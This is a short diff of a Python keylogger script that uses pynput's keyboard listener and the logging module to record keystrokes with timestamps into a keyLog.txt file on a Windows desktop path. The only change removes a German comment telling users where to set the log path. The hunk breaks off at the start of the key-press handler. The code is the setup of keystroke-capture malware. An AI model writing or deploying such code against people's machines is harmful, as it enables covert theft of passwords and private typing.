@@ -1,7 +1,7 @@
 from pynput.keyboard import Key, Listener
 import logging
 
-log_dir = r"C:/users/drbumm/desktop/" # Hier euren pfad rein schreibenwo ihr die datei haben wollt
+log_dir = r"C:/users/drbumm/desktop/"
 logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_press(key):
